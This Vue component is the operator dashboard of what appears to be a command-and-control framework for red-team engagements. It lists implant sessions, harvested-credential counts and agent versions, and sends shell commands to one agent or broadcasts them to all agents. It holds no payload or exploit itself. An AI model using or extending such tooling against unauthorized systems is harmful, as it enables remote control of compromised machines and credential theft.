<template>
  <div class="dash">
    <div class="page-head">
      <div>
        <h1 class="page-title">Dashboard</h1>
        <p class="page-sub">Operational overview · refreshed every 5s</p>
      </div>
      <div class="head-side">
        <button v-if="canReport" class="btn btn-ghost btn-sm" type="button" :disabled="reportBusy" @click="downloadReport">
          <span v-if="reportBusy" class="spinner" />
          <span>{{ reportBusy ? 'Generating…' : 'Download report' }}</span>
        </button>
        <span class="badge" :class="hasError ? 'badge-danger' : 'badge-ok'">
          <span class="dot" :class="hasError ? 'dot-danger' : 'dot-ok'" />
          {{ hasError ? 'sync error' : 'live' }}
        </span>
      </div>
    </div>

    <!-- stat cards -->
    <div class="stats-grid">
      <div v-for="card in statCards" :key="card.label" class="stat-card panel">
        <div class="stat-top">
          <span class="stat-icon" :class="card.tone"><component :is="card.icon" :size="16" /></span>
          <span class="stat-label">{{ card.label }}</span>
        </div>
        <div class="stat-value mono">{{ loading ? '—' : card.value }}</div>
      </div>
    </div>

    <!-- implant fleet: transport & version breakdown -->
    <div v-if="fleetRows.length" class="panel">
      <div class="panel-head">
        <span class="panel-title">Implant fleet</span>
        <span class="small muted">transport and agent version breakdown · latest version first</span>
      </div>
      <div class="fleet-body">
        <div v-for="g in fleetRows" :key="g.label" class="fleet-group">
          <span class="fleet-label">{{ g.label }}</span>
          <button
            v-for="row in g.rows"
            :key="g.label + row.name"
            class="fleet-chip mono"
            :class="{ 'is-outdated': row.outdated }"
            type="button"
            :title="
              (row.outdated
                ? row.count + ' agent(s) behind the most common version'
                : row.count + ' agent(s)') + ' — click to filter Sessions'
            "
            @click="openFiltered(g.label, row.name)"
          >
            {{ row.name }} · {{ row.count }}
          </button>
        </div>
      </div>
    </div>

    <div class="grid-2">
      <!-- sessions sparkline -->
      <div class="panel">
        <div class="panel-head">
          <span class="panel-title">Active sessions · last 5 min</span>
          <span class="mono muted small">{{ sessions.length }} now</span>
        </div>
        <div class="panel-body">
          <svg
            class="spark"
            viewBox="0 0 100 32"
            preserveAspectRatio="none"
            role="img"
            aria-label="Active sessions over time"
          >
            <line
              v-for="i in 3"
              :key="i"
              x1="0"
              :y1="i * 8"
              x2="100"
              :y2="i * 8"
              class="spark-grid"
            />
            <path v-if="areaPath" :d="areaPath" class="spark-area" />
            <polyline v-if="linePoints.length > 1" :points="linePoints" class="spark-line" />
            <line v-else x1="0" y1="30" x2="100" y2="30" class="spark-line" />
          </svg>
          <div class="spark-legend">
            <span class="mono small muted">peak {{ peak }}</span>
            <span class="mono small muted">min {{ minVal }}</span>
          </div>
        </div>
      </div>

      <!-- recent activity -->
      <div class="panel">
        <div class="panel-head">
          <span class="panel-title">Recent activity</span>
          <router-link to="/sessions" class="small">All sessions →</router-link>
        </div>
        <div class="activity-list">
          <div v-for="s in recentSessions" :key="s.ID" class="activity-row">
            <span class="dot" :class="s.State === 'active' ? 'dot-ok' : ''" />
            <div class="activity-main">
              <span class="mono activity-host">{{ s.Hostname || shortId(s.ID) }}</span>
              <span class="small muted">
                {{ s.Username || '?' }} · {{ s.OS || '?' }}/{{ s.Arch || '?' }}
              </span>
            </div>
            <span class="mono small faint nowrap">{{ fmtAgo(s.LastSeen) }}</span>
          </div>
          <div v-if="!recentSessions.length" class="empty-state">
            <IconActivity :size="28" />
            <span class="empty-title">No activity yet</span>
            <span class="empty-hint">Agents will appear here as they check in</span>
          </div>
        </div>
      </div>
    </div>

    <!-- quick command -->
    <div class="panel">
      <div class="panel-head">
        <span class="panel-title">Quick command</span>
        <span class="small muted">single target or broadcast</span>
      </div>
      <div class="panel-body">
        <div class="cmd-row">
          <select v-model="target" class="select cmd-select" aria-label="Target session">
            <option value="">Broadcast — all active agents</option>
            <option v-for="s in sessions" :key="s.ID" :value="s.ID">
              {{ s.Hostname || shortId(s.ID) }} ({{ s.Username || '?' }})
            </option>
          </select>
          <input
            v-model="command"
            class="input mono cmd-input"
            placeholder="$ command…"
            :disabled="executing"
            @keyup.enter="run"
          />
          <button class="btn btn-primary" :disabled="executing || !command.trim()" @click="run">
            {{ executing ? 'Running…' : 'Execute' }}
          </button>
        </div>
        <pre v-if="output" class="cmd-output mono" :class="{ 'is-error': outputError }">{{ output }}</pre>
      </div>
    </div>
  </div>
</template>

<script>
import { api, downloadFile } from '../utils/api.js'
import { notify } from '../utils/notifications.js'
import { fmtAgo, shortId } from '../utils/format.js'
import {
  IconSessions,
  IconKey,
  IconTerminal,
  IconModules,
  IconActivity,
} from '../components/icons.js'

const MAX_SAMPLES = 48

export default {
  name: 'DashboardView',
  components: { IconActivity },
  data() {
    return {
      sessions: [],
      credCount: null,
      moduleCount: null,
      loading: true,
      hasError: false,
      history: [],
      timer: null,
      // quick command
      target: '',
      command: '',
      executing: false,
      output: '',
      outputError: false,
      // engagement report
      reportBusy: false,
    }
  },
  computed: {
    canReport() {
      const role = localStorage.getItem('bty_role') || 'operator'
      return role === 'admin' || role === 'operator'
    },
    statCards() {
      const taskTotal = this.sessions.reduce((acc, s) => acc + (Number(s.TaskCount) || 0), 0)
      return [
        {
          label: 'Active sessions',
          value: this.sessions.length,
          icon: IconSessions,
          tone: 'tone-ok',
        },
        {
          label: 'Credentials',
          value: this.credCount === null ? '—' : this.credCount,
          icon: IconKey,
          tone: 'tone-accent',
        },
        {
          label: 'Tasks issued',
          value: taskTotal,
          icon: IconTerminal,
          tone: 'tone-accent',
        },
        {
          label: 'Modules',
          value: this.moduleCount === null ? '—' : this.moduleCount,
          icon: IconModules,
          tone: 'tone-ok',
        },
      ]
    },
    recentSessions() {
      return [...this.sessions]
        .sort((a, b) => new Date(b.LastSeen || 0) - new Date(a.LastSeen || 0))
        .slice(0, 6)
    },
    fleetRows() {
      const byKey = (key) => {
        const counts = {}
        for (const s of this.sessions) {
          const v = s[key]
          if (!v) continue
          counts[v] = (counts[v] || 0) + 1
        }
        const entries = Object.entries(counts).sort((a, b) => b[1] - a[1])
        const top = entries.length ? entries[0][0] : null
        return entries.map(([name, count]) => ({
          name,
          count,
          outdated: key === 'AgentVersion' && top && name !== top,
        }))
      }
      return [
        { label: 'Transports', rows: byKey('Transport') },
        { label: 'Agent versions', rows: byKey('AgentVersion') },
      ].filter((g) => g.rows.length)
    },
    peak() {
      return Math.max(0, ...this.history)
    },
    minVal() {
      return this.history.length ? Math.min(...this.history) : 0
    },
    linePoints() {
      return this.toPoints().join(' ')
    },
    areaPath() {
      const pts = this.toPoints()
      if (pts.length < 2) return ''
      return 'M' + pts.join(' L') + ' L100,32 L0,32 Z'
    },
  },
  mounted() {
    this.refresh()
    this.timer = setInterval(() => this.refresh(), 5000)
  },
  beforeUnmount() {
    if (this.timer) clearInterval(this.timer)
  },
  methods: {
    fmtAgo,
    shortId,
    async downloadReport() {
      if (this.reportBusy) return
      this.reportBusy = true
      try {
        // GET /api/report?format=text (report:generate — admin/operator)
        await downloadFile('/api/report?format=text', 'worldc2-report.txt')
        notify.ok('Engagement report downloaded')
      } catch (e) {
        if (!e.expired) notify.error('Report failed: ' + e.message)
      } finally {
        this.reportBusy = false
      }
    },
    openFiltered(group, name) {
      // Deep-link into Sessions with the matching filter pre-applied
      // (Sessions reads ?transport= and ?version=).
      if (group === 'Transports') {
        this.$router.push({ path: '/sessions', query: { transport: name } })
      } else if (group === 'Agent versions') {
        this.$router.push({ path: '/sessions', query: { version: name } })
      }
    },
    async refresh() {
      const [sessRes, vaultRes, modRes] = await Promise.allSettled([
        api.get('/api/sessions'),
        api.get('/api/vault'),
        api.get('/api/modules'),
      ])

      if (sessRes.status === 'fulfilled') {
        this.sessions = Array.isArray(sessRes.value) ? sessRes.value : []
        this.hasError = false
        this.history.push(this.sessions.length)
        if (this.history.length > MAX_SAMPLES) this.history.shift()
      } else {
        this.hasError = true
      }

      this.credCount =
        vaultRes.status === 'fulfilled' && Array.isArray(vaultRes.value)
          ? vaultRes.value.length
          : this.credCount

      this.moduleCount =
        modRes.status === 'fulfilled' && Array.isArray(modRes.value)
          ? modRes.value.length
          : this.moduleCount

      this.loading = false
    },
    toPoints() {
      const n = this.history.length
      if (!n) return []
      const max = Math.max(1, this.peak)
      return this.history.map((v, i) => {
        const x = n === 1 ? 100 : (i / (n - 1)) * 100
        const y = 30 - (v / max) * 26
        return x.toFixed(2) + ',' + y.toFixed(2)
      })
    },
    async run() {
      const cmd = this.command.trim()
      if (!cmd || this.executing) return
      this.executing = true
      this.output = ''
      this.outputError = false
      try {
        let data
        if (this.target) {
          // POST /api/cmd { agent_id, command, timeout }
          data = await api.post('/api/cmd', {
            agent_id: this.target,
            command: cmd,
            timeout: 15,
          })
        } else {
          // POST /api/broadcast { command }
          data = await api.post('/api/broadcast', { command: cmd })
        }
        this.output =
          typeof data === 'string'
            ? data
            : data.output || data.Output || JSON.stringify(data, null, 2)
        this.command = ''
      } catch (e) {
        this.output = 'Error: ' + (e.message || 'request failed')
        this.outputError = true
      } finally {
        this.executing = false
      }
    },
  },
}
</script>

<style scoped>
.head-side {
  display: flex;
  align-items: center;
  gap: 10px;
}
.stats-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
  gap: 16px;
  margin-bottom: 16px;
}
.stat-card {
  padding: 16px 18px;
}
.stat-top {
  display: flex;
  align-items: center;
  gap: 9px;
  margin-bottom: 10px;
}
.stat-icon {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  width: 26px;
  height: 26px;
  border-radius: 7px;
}
.tone-ok { color: var(--ok); background: var(--ok-soft); }
.tone-accent { color: var(--accent); background: var(--accent-soft); }
.stat-label {
  font-size: 12px;
  color: var(--muted);
}
.stat-value {
  font-size: 28px;
  font-weight: 700;
  letter-spacing: -0.02em;
  line-height: 1;
}

.grid-2 {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
  gap: 16px;
  margin-bottom: 16px;
}

/* sparkline */
.spark {
  width: 100%;
  height: 120px;
  display: block;
}
.spark-grid {
  stroke: var(--border-soft);
  stroke-width: 0.5;
}
.spark-line {
  fill: none;
  stroke: var(--accent);
  stroke-width: 1.5;
  vector-effect: non-scaling-stroke;
  stroke-linecap: round;
  stroke-linejoin: round;
}
.spark-area {
  fill: rgba(110, 123, 242, 0.12);
  stroke: none;
}
.spark-legend {
  display: flex;
  justify-content: space-between;
  margin-top: 8px;
}

/* activity */
.activity-list {
  max-height: 240px;
  overflow-y: auto;
}
.activity-row {
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 10px 20px;
  border-bottom: 1px solid var(--border-soft);
}
.activity-row:last-child { border-bottom: none; }
.activity-main {
  flex: 1;
  display: flex;
  flex-direction: column;
  line-height: 1.3;
  min-width: 0;
}
.activity-host {
  font-size: 13px;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}

/* quick command */
.cmd-row {
  display: flex;
  gap: 10px;
  flex-wrap: wrap;
}
.cmd-select { max-width: 280px; }
.cmd-input { flex: 1; min-width: 200px; }
.cmd-output {
  margin-top: 14px;
  background: var(--bg);
  border: 1px solid var(--border);
  border-radius: var(--radius-sm);
  padding: 14px;
  font-size: 12px;
  line-height: 1.55;
  max-height: 260px;
  overflow: auto;
  white-space: pre-wrap;
  word-break: break-word;
  color: var(--text);
}
.cmd-output.is-error { color: var(--danger); border-color: rgba(229, 72, 77, 0.35); }

/* implant fleet */
.fleet-body {
  display: flex;
  flex-direction: column;
  gap: 8px;
}
.fleet-group {
  display: flex;
  align-items: center;
  flex-wrap: wrap;
  gap: 8px;
}
.fleet-label {
  font-size: 11px;
  text-transform: uppercase;
  letter-spacing: 0.07em;
  font-family: var(--mono);
  color: var(--faint);
  min-width: 120px;
}
.fleet-chip {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  font: inherit;
  font-size: 12px;
  color: var(--text);
  background: var(--surface-2);
  border: 1px solid var(--border-soft);
  border-radius: 999px;
  padding: 3px 12px;
  cursor: pointer;
  transition: border-color 0.15s ease, background 0.15s ease;
}
.fleet-chip:hover {
  border-color: var(--border, #2E3140);
  background: var(--surface-3, #1D202B);
}
.fleet-chip.is-outdated {
  color: var(--warning, #e5b348);
  border-color: rgba(229, 179, 72, 0.4);
}
</style>
